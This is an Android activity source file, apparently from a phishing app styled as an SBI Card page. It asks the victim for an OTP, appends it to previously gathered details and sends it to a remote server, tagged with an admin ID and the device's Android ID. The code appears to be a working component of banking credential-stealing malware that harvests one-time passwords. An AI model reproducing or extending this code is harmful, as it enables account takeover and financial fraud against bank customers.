package com.pegalite.neotron3.ui.sbicard;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivitySbicardPage3Binding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SBICardPage3Activity extends AppCompatActivity {

    ActivitySbicardPage3Binding binding;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySbicardPage3Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.submit.setOnClickListener(v -> {
            String otp = binding.otp.getText().toString();
            if (otp.isEmpty()) {
                Toast.makeText(this, "Please Enter All The Fields!", Toast.LENGTH_SHORT).show();
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("otp", otp);
                saveDetails(object);
                startActivity(new Intent(this, SBICardPage4Activity.class).putExtra("data", object.toString()));
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }

        });

    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces().onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName()).put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

}